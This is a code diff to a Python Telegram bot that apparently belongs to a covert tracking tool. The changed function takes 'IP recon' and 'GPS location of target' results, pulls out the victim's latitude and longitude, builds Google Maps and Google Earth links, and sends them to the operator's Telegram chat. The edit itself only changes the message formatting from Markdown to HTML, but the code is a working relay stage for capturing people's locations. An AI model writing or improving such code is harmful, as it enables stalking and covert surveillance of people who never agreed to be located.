@@ -239,7 +239,7 @@ def update_location():
                     logging.error(f"Error sending IP recon to Telegram: {e}")
                     bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
             
-            # GPS Location
+            # GPS Location part with HTML formatting
             elif 'title' in embed and embed['title'] == 'GPS location of target..':
                 description = embed['description']
                 
@@ -248,26 +248,26 @@ def update_location():
                 lon_match = re.search(r'Longitude:([^\n]+)', description)
                 
                 # Format message for Telegram
-                msg = "*GPS Location of Target*\n\n"
+                msg = "<b>GPS Location of Target</b>\n\n"
                 
                 if lat_match and lon_match:
                     lat = lat_match.group(1).strip()
                     lon = lon_match.group(1).strip()
                     
-                    msg += f"*Latitude:* `{lat}`\n"
-                    msg += f"*Longitude:* `{lon}`\n\n"
-                    msg += f"[View on Google Maps](https://www.google.com/maps?q={lat},{lon})"
-                    msg += f"[View on Google Earth](https://earth.google.com/web/search/{lat},{lon})"
+                    msg += f"<b>Latitude:</b> <code>{lat}</code>\n"
+                    msg += f"<b>Longitude:</b> <code>{lon}</code>\n\n"
+                    msg += f"<a href='https://www.google.com/maps?q={lat},{lon}'>View on Google Maps</a>\n"
+                    msg += f"<a href='https://earth.google.com/web/search/{lat},{lon}'>View on Google Earth</a>"
                 
                 # Add footer if present
                 if 'footer' in embed and 'text' in embed['footer']:
-                    msg += f"\n\n_Note: {embed['footer']['text']}_"
+                    msg += f"\n\n<i>Note: {embed['footer']['text']}</i>"
                 
                 try:
-                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                    bot.send_message(chat_id, msg, parse_mode="HTML")  # Change to HTML here
                 except Exception as e:
                     logging.error(f"Error sending GPS info to Telegram: {e}")
-                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
+                    bot.send_message(chat_id, msg.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', '').replace('<a href=', '').replace('</a>', ''))
         
         # Permission denied message
         elif 'content' in data and 'User denied the request for Geolocation' in data.get('content', ''):
